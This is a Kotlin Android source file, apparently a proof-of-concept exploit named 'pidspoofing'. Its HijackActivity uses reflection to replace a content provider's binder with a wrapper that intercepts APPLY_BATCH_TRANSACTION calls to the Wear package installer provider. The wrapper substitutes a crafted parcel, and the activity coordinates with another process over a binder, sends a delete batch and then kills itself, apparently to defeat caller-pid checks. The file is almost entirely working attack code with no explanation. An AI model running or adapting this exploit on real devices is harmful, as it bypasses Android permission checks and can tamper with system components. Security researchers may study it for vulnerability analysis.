package jp.plum.pidspoofing

import android.content.ContentProviderOperation
import android.content.IContentProvider
import android.net.Uri
import android.os.*
import androidx.appcompat.app.AppCompatActivity
import android.util.Log
import kotlinx.coroutines.*
import org.jetbrains.anko.button
import org.jetbrains.anko.sdk27.coroutines.onClick
import org.jetbrains.anko.verticalLayout
import kotlin.system.exitProcess

class HijackActivity : AppCompatActivity() {
    companion object {
        private const val authority = "com.google.android.packageinstaller.wear.provider"
        private const val uri = "content://$authority"
        const val limit = 2
        val source = "a b c d e f g".split(" ")
        private val request = ContentProviderOperation.newDelete(Uri.parse(uri)).build()
    }

    val binder by lazy {
        intent.getIBinderExtra(MainActivity.Key)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        installResolver()
        verticalLayout {
            button("Apply Batch For PackageInstaller") {
                onClick {
                    // async run on Dispatchers.IO & swallow all exceptions
                    (GlobalScope + CoroutineExceptionHandler { _, _ -> }).launch(Dispatchers.IO) {
                        binder.transact(
                            MainActivity.RollingTo,
                            Parcel.obtain().apply { writeInt(Process.myPid()) },
                            Parcel.obtain(),
                            0
                        )
                        contentResolver.applyBatch(authority, arrayListOf(request))
                        Log.e(TAG, "commit applyBatch operation to package installer")
                        delay(200L)
                        exitProcess(0)
                    }
                }
            }
        }
    }

    private fun installResolver() {
        val proxy = contentResolver.acquireProvider(authority)
        val field = proxy.javaClass.getDeclaredField("mRemote")
        field.isAccessible = true
        val src = field.get(proxy) as IBinder
        val changed = installRemote(src)
        field.set(proxy, changed)
    }

    private fun installRemote(remote: IBinder) = object : IBinder by remote {
        override fun transact(
            code: Int,
            data: Parcel,
            reply: Parcel,
            flags: Int
        ) = when (code) {
            IContentProvider.APPLY_BATCH_TRANSACTION -> {
                Log.e(TAG, "begin transact")
                remote.transact(
                    code,
                    Ropes(
                        source,
                        limit,
                        binder
                    ).buildParcel(
                        request, authority
                    ),
                    reply,
                    flags
                )
            }
            else -> remote.transact(code, data, reply, flags)
        }
    }
}